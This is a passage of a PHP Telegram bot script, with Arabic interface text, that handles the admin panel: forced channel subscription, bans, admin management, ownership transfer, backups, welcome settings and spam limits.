            if($chat_id == $admin){
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"التكرار $spam",'callback_data'=>"spam"],['text'=>"عدد التكرار $numspam 😬",'callback_data'=>"numspam"]
],
[
['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"توجيه 🔄",'callback_data'=>"forward"]
],
[
['text'=>"الأدمنة 👥⁦👮🏻‍♂️⁩",'callback_data'=>"admins"]
],
[
['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]
],
[
['text'=>"نقل ملكية البوت 🔱",'callback_data'=>"MoveAdmin"]
],
[
['text'=>"جلب نسخة بيانات 📥🗃",'callback_data'=>"Download"],['text'=>"رفع نسخة 📤🗃",'callback_data'=>"Update"]
],
[
['text'=>"حذف التخزين المؤقت 🗑️⌛",'callback_data'=>"DeletFile"]
],
[
['text'=>"تعين نص الترحيب 💬♥️",'callback_data'=>'StartText'],['text'=>"تعين صورة الترحيب 🖼️♥️",'callback_data'=>'StartPhoto']
],
 [
['text'=>"مسح البيانات 🗑️🗂️",'callback_data'=>'DalAll']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
		}elseif(in_array($chat_id,$sting['sting']['admins'])){
			bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"التكرار $spam",'callback_data'=>"spam"],['text'=>"عدد التكرار $numspam 😬",'callback_data'=>"numspam"]
],
[
['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"توجيه 🔄",'callback_data'=>"forward"]
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
			}
		}
		if($data == "km"){
		$band = count($sting['sting']['band']);
		if(in_array($chat_id,$sting['ford'])){$ford = 'مفعل ✅';}else{$ford = 'معطل ❎';}
	if(in_array($chat_id,$sting['onstart'])){$onstart = 'مفعل ✅';}else{$onstart = 'معطل ❎';}
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	if(in_array($chat_id,$sting['tw'])){$tw = 'مفعل ✅';}else{$tw = 'معطل ❎';}
	
 $spam = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['spam']);
	$m = count($members) -1;
	$d = count($day)-1;
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
            'text'=>"إحصائيات البوت كالتالي 🤖:
عدا الأعضاء 👤 «".$m."»
عدد المتفاعلين اليوم : «".$d."»
عدد المحظورين 📛 : «".$band."»
التوجيه 🔄 : «".$ford."»
التنبيه 📣 : «".$onstart."»
البوت 🤖 : «".$bot."»
التواصل 📞 : «".$tw."»
", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"back"]
],
]])
            ]); 
		}
		
				if($data == "ch" or $data == "ch1del" or $data == "ch2del" or $data == "ch3del" or $data == "ch4del" or $data == "ch5del"){
					if($data == "ch1del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 1 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch1']);
						}
						if($data == "ch2del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 2 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch2']);
						}
						if($data == "ch3del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 3 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch3']);
						}
						if($data == "ch4del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 4 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch4']);
						}
						if($data == "ch5del"){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 5 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($sting['sting']['ch5']);
						}
					if($sting['sting']['ch1'] == null){
						$ch1 = "قناة 1 🔱 لا يوجد 😴";
						}else{
							$ch3 = bot('getchat',['chat_id'=>$sting['sting']['ch1']]);
							if($ch3->ok == true){
								$ch1 = $ch3->result->title;
								}else{
									$ch1 = "قناة 1 🔱 لا يوجد 😴";
									}
							}
							if($sting['sting']['ch2'] == null){
						$ch2 = "قناة 2 🔱 لا يوجد 🌚";
						}else{
							$ch = bot('getchat',['chat_id'=>$sting['sting']['ch2']]);
							if($ch->ok == true){
								$ch2 = $ch->result->title;
								}else{
									$ch2 = "قناة 2 🔱 لا يوجد ??";
									}
							}
							if($sting['sting']['ch3'] == null){
						$ch3 = "قناة 3 🔱 لا يوجد 🌚";
						}else{
							$ch = bot('getchat',['chat_id'=>$sting['sting']['ch3']]);
							if($ch->ok == true){
								$ch3 = $ch->result->title;
								}else{
									$ch3 = "قناة 3 🔱 لا يوجد 🌚";
									}
							}
							if($sting['sting']['ch4'] == null){
						$ch4 = "قناة 4 🔱 لا يوجد 🌚";
						}else{
							$ch = bot('getchat',['chat_id'=>$sting['sting']['ch4']]);
							if($ch->ok == true){
								$ch4 = $ch->result->title;
								}else{
									$ch4 = "قناة 4 🔱 لا يوجد 🌚";
									}
							}
							if($sting['sting']['ch5'] == null){
						$ch5 = "قناة 5 🔱 لا يوجد 🌚";
						}else{
							$ch = bot('getchat',['chat_id'=>$sting['sting']['ch5']]);
							if($ch->ok == true){
								$ch5 = $ch->result->title;
								}else{
									$ch5 = "قناة 5 🔱 لا يوجد 🌚";
									}
							}
					bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك أوامر الإشتراك الإجباري 😼
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"$ch1",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 👌",'callback_data'=>"ch1add"],['text'=>"حذف قناة 🤟",'callback_data'=>"ch1del"]
],
[
['text'=>"$ch2",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 😼",'callback_data'=>"ch2add"],['text'=>"حذف قناة 🤙",'callback_data'=>"ch2del"]
],
[
['text'=>"$ch3",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 😎",'callback_data'=>"ch3add"],['text'=>"حذف قناة 😴",'callback_data'=>"ch3del"]
],
[
['text'=>"$ch4",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 💐",'callback_data'=>"ch4add"],['text'=>"حذف قناة 🤸",'callback_data'=>"ch4del"]
],
[
['text'=>"$ch5",'callback_data'=>"ch"]
],
[
['text'=>"وضع قناة 👀",'callback_data'=>"ch5add"],['text'=>"حذف قناة 💀",'callback_data'=>"ch5del"]
],
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
					}
					if($data == "ch1add" or $data == "ch2add" or $data == "ch3add" or $data == "ch4add" or $data == "ch5add"){
						bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الأن معرف القناة Ⓜ️ او وجه أي رسالة من القناة 🔄
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"ch"]
]
]])
]);
if($data == "ch1add"){
$sting['sting']['sting'] = "ch1";
}
if($data == "ch2add"){
$sting['sting']['sting'] = "ch2";
}
if($data == "ch3add"){
$sting['sting']['sting'] = "ch3";
}
if($data == "ch4add"){
$sting['sting']['sting'] = "ch4";
}
if($data == "ch5add"){
$sting['sting']['sting'] = "ch5";
}
	$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
						}
						if(!$data and $sting['sting']['id'] == $from_id and $update->message->forward_from_chat or preg_match("/(@)(.)/", $text)){
							if($sting['sting']['sting'] == 'ch1' or $sting['sting']['sting'] == 'ch2' or $sting['sting']['sting'] == 'ch3' or $sting['sting']['sting'] == 'ch4' or $sting['sting']['sting'] == 'ch5'){
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ القناة بنجاح ✅
	تأكد أن البوت مشرف في القناة ⁦👮🏻‍♂️⁩
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'ch']
],
]])
]);
if($update->message->forward_from_chat){
	$sting['sting'][$sting['sting']['sting']] = $update->message->forward_from_chat->id;
	}else{
		$sting['sting'][$sting['sting']['sting']] = $text;
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
							}
							}
	if($data == "admins"){
		foreach($sting['sting']['admins'] as $admins){
		$names = bot("getchat",["chat_id"=>$admins])->result->first_name;
		if($names != null){
		$addmins .= "[$names](tg://user?id=$admins)\n";
		}
		}
		if(addmins == null){
			bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
عذرا لا يوجد أي أدمن مرفوع 😅
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
			}else{
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تفضل عزيزي الأدمن ⁦👮🏻‍♂️⁩ قائمة الأدمنة 📃
	$addmins
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
		}
		}
							if($data == "band"){
								$band = count($sting['sting']['band']);
								bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك أوامر الحظر 🤟
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"المحظورين 📛  «".$band."»",'callback_data'=>"bander"]
],
[
['text'=>"حظر ➕⛔",'callback_data'=>"bandadd"],['text'=>"إلغاء حظر ➖⛔",'callback_data'=>"delband"]
],
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
								}
								if($data == "bandadd" or $data == "delband"){
									$a = str_replace(['bandadd','delband'],['لأحظره من البوت 📛','لأزيله من المحظورين 😃'],$data);
									bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الان ايدي 🆔 العضو $a 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"band"]
],
]])
]);
$sting['sting']['sting'] = $data;
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
									}
									if(!$update->callback_query){
						if($text != null and $sting['sting']['sting'] == "bandadd" or $sting['sting']['sting'] == "delband" and $sting['sting']['id'] == $from_id){
							$a = str_replace(['bandadd','delband'],['حظره بنجاح 😏','إلغاء حظره بنجاح 😴'],$sting['sting']['sting']);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم $a
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'band']
],
]])
]);
if($sting['sting']['sting'] == "bandadd"){
	$sting['sting']['band'][] = $text;
	}else{
		$num = array_search($text,$sting['sting']['band']);
		unset($sting['sting']['band'][$num]);
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
							}
							}
							if($data == "bander"){
								foreach($sting['sting']['band'] as $band){
									if($band != null){
									$s .= "`$band` » [للدخول إلى الحساب 🍃](tg://user?id=$band)\n";
									}
}
if($s == null){
	bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
عذرا لا يوجد أي شخص محظور 😅❤️
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"band"]
],
]])
]);
	}else{
								bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك قائمة المحظورين 📛
$s
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"band"]
],
]])
]);
								}
								}
								if($data == "addadmin" or $data == "deladmin"){
									$a = str_replace(['addadmin','deladmin'],['لأرفعه أدمن ⁦☺️⁩','لأزيله من قائمة الأدمنة 😼'],$data);
									bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الان ايدي 🆔 العضو $a 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
],
]])
]);
$sting['sting']['sting'] = $data;
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
									}
									if(!$update->callback_query){
						if($text != null and $sting['sting']['sting'] == "addadmin" or $sting['sting']['sting'] == "deladmin" and $sting['sting']['id'] == $from_id){
							$a = str_replace(['addadmin','deladmin'],['تم رفعه بنجاح 😉','تم تنزيله بنجاح 😏'],$sting['sting']['sting']);
if($sting['sting']['sting'] == "addadmin"){
	$sting['sting']['admins'][] = $text;
	bot('sendmessage',[
	'chat_id'=>$text, 
	'text'=>"
	مبارك تم رفعك كمشرف في البوت 🤩
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'القائمة الرئيسية 🏠','callback_data'=>'back']
],
]])
]);
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم رفعه بنجاح 😉
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
	}else{
		$num = array_search($text,$sting['sting']['admins']);
		if($num){
		unset($sting['sting']['admins'][$num]);
		bot('sendmessage',[
	'chat_id'=>$text, 
	'text'=>"
	تم تنزيلك من الإشراف 😒
	",
]);
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم تنزيله بنجاح 😉
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
		}else{
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	عذرا هذا العضو غير موجود 😶
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
			}
		}
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting,64|128|256));
							}
							}
		}
if($data == "numspam"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الأن عدد مرات التكرار المسموح بها 😉
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
]
]])
]);
$sting['sting']['sting'] = "spam";
$sting['sting']['id'] = $from_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}

if(is_numeric($text) and $sting['sting']['sting'] == "spam" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ عدد مرات التكرار بنجاح ✓.
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
$sting['sting']['spamn'] = $text;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "MoveAdmin" and $chat_id == $admin){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
قم بإرسال ايدي العضو المراد نقل ملكية البوت له 🆔🔱
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
]
]])
]);
$sting['sting']['sting'] = "moveadmin";
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($text != "/start" and !$data and $from_id == $admin and $sting['sting']['sting'] == "moveadmin"){
$namer = bot('getchat',['chat_id'=>$text])->result->first_name;
if($namer){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	هل أنت متأكد 🧐 أنك تريد نقل ملكية البوت 🤔؟
	سيتم نقل ملكية البوت إلى $namer 👤 وتنزيلك لرتبة عضو 🙁
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'نعم ✅','callback_data'=>'yes*'.$text],['text'=>'لا ❎','callback_data'=>'back']
],
]])
]);
}else{
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	عذرا هذا العضو غير موجود 😅 يمكنك إرسل أيدي العضو مرة أخرة 😉
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
}
}
$ex = explode('*',$data);
if($ex[0] == 'yes' and $from_id == $admin and $sting['sting']['sting'] == "moveadmin"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تم نقل ملكية البوت بنجاح ✓.
	",
]);
bot('sendmessage',[
	'chat_id'=>$ex[1], 
	'text'=>"
	تم نقل ملكية البوت لك 🔱♥️
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'الصفحة الرئيسية 🏠','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
$sting['sting']['admins'][0] = $ex[1];
	file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "Download" and $from_id == $admin){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	جاري جلب نسخة إحتياطية 😁
	"]);
	bot('SendDocument',[
'chat_id'=>$chat_id,
'document'=>new CURLFile('sting.json'),
'caption'=>'نسخة للبينات ℹ️',
]);
bot('SendDocument',[
'chat_id'=>$chat_id,
'document'=>new CURLFile('members.txt'),
'caption'=>'نسخة للمشتركين ℹ️',
]);
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تم جلب نسخة إحتياطية بنجاح ✓.
	",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"back"]
]
]])
]);
}
if($data == "Update"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>'
	لرفع نسخة إحتياطية من البيانات أرسل ملف بصيغة .json 🗃️
			ولرفع نسخة إحتياطية من الأعضاء أرسل ملف بصيغة .txt 🗂️
			','reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>"back"]],
]])
]);
$sting['sting']['sting'] = 'file';
	file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($chat_id == $admin and $sting['sting']['sting'] == 'file'){
				if($message->document){
					if(preg_match('/(.txt)/',$message->document->file_name)){
    $file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->document->file_id])->result->file_path;
	    file_put_contents('members.txt',file_get_contents($file));
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
تم رفع ملف المشتركين بنجاح ✓
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'رجوع 🔙','callback_data'=>"back"]],
     ]])
     ]);
}elseif(preg_match('/(.json)/',$message->document->file_name)){
    $file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->document->file_id])->result->file_path;
	    file_put_contents('sting.json',file_get_contents($file));
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
تم رفع ملف البيانات بنجاح ✓
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'رجوع 🔙','callback_data'=>"back"]],
     ]])
     ]);
     }else{
     bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
عذرا هذا الملف خاطء يجب ان تنتهي نهايته ب .json او .txt !
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'رجوع 🔙','callback_data'=>"back"]],
     ]])
     ]);
     }
				}
			}
			if($data == "DeletFile"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	جاري حذف الملفات المؤقتة ♻️🗑️
			"
]);
$a = filesize('sting.json');
unset($sting['tws']);
$a -= filesize('sting.json');
$file = scandir('spam');
foreach($file as $u){
if($u != '.' and $u != '..'){
$a += filesize("spam/$u");
unlink("spam/$u");
}
}
$day = ['Sat','Sun','Mon','Tue','Wed','Thu','Fri'];
$d = date('D');
unset($day[array_search($d)]);
foreach($day as $Day){
$a += filesize($Day);
unlink($Day.'.txt');
}
sleep(1);
$size = YhyaSyrian($a);
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تم حذف الملفات المؤقتة ♻️🗑️
	تم تفريغ $size مساحة من الذاكرة المؤقتة 🗑️
			",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
}
if($data == "StartText"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الأن نص الترحيب 💬❤️
يمكنك وضع 🎟️ التالي في نص الترحيب : 
#name لوضع اسم العضو 💫
#id لوضع ايدي العضو 🆔
@#user لوضع يوزر العضو Ⓜ️
#number لوضع عدد مشتركين البوت 📊
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
]
]])
]);
$sting['sting']['sting'] = "Start";
$sting['sting']['id'] = $from_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}

if($text and !$data and $sting['sting']['sting'] == "Start" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ نص الترحيب بنجاح ✓.
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
$sting['sting']['start'] = $text;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "urlindex"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
حسنل عزيزي ارسل الرابط الجديد 🎉
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
]
]])
]);
$sting['sting']['sting'] = "urlIndex";
$sting['sting']['id'] = $from_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}

if(preg_match("/\b(?:(?:https?|http):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$text) and !$data and $sting['sting']['sting'] == "urlIndex" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ الرابط بنجاح ✓
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
$sting['sting']['urlIndex'] = $text;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "StartPhoto"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل صورة الترحيب الأن 🖼️❤️.
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"back"]
]
]])
]);
$sting['sting']['sting'] = "StartPhoto";
$sting['sting']['id'] = $from_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}

if($photo and !$data and $sting['sting']['sting'] == "StartPhoto" and $sting['sting']['id'] == $from_id){
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ صورة الترحيب بنجاح ✓.
	في حال حصول أي مشكلة سيتم إرسال نص الترحيب بدلا من توقف البوت عن العمل ♻️
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
$sting['sting']['photostart'] = $photo[0]->file_id;
file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($data == "DalAll"){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
هل أنت متأكد من حذف البيانات ‼️
سيترتب على ذالك حذف جميع ملف الأعضاء والإعدادات ⚙️🗑️
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'نعم ✅','callback_data'=>'yesdel'],['text'=>'لا ❎','callback_data'=>'back']
]
]])
]);
}
if($data == "yesdel" and $chat_id == $admin){
	bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	جاري حذف البيانات ♻️🗑️
	"]);
	unlink("members.txt");
	unlink("sting.json");
	$file = scandir('spam');
foreach($file as $u){
if($u != '.' and $u != '..'){
$a += filesize("spam/$u");
unlink("spam/$u");
}
}
sleep(1);
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	جاري رفعك مالك في البوت 🔰🔱
	"]);
	sleep(1);
	$ab['sting']['admins'][0] = $chat_id;
	file_put_contents("sting.json",json_encode($ab));
	bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تم حذف جميع البيانات 🗑️ وتصفير البوت 🔰.
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'الصفحة الرئيسية 🏠','callback_data'=>'back']
],
]])
]);
	}
	$timer = json_decode(file_get_contents("spam/time.json"),1);
if($message and $sting['sting']['spam'] == "true" and !in_array($chat_id,$sting['sting']['admins'])){
$time = date('Y-n-d-h-i');
$timer[$time][$chat_id] += 1;
file_put_contents("spam/time.json",json_encode($timer));
if($timer[$time][$chat_id] >= $sting['sting']['spamn']){
$H = date('H');
$H = 23 - $H;
$H += 1;
if($H == 1){
$H = 'ساعة';
}elseif($H == 2){
$H = 'ساعتان';
}else{
$H = "$H ساعات";
}
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حظرك لمدة $H 🕛 بسبب تكرارك للرسائل 😑
	"]);
	$date = date('Y-n-d');
	file_put_contents("spam/$date",$from_id."\n",FILE_APPEND);
	exit;
}
}
if($data == 'sendprofile' or $data == 'forward'){
	if($sting['send']['id'] != null){
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	يجب عليك انتظار إنتهاء الإذاعة العادية /: 🙁
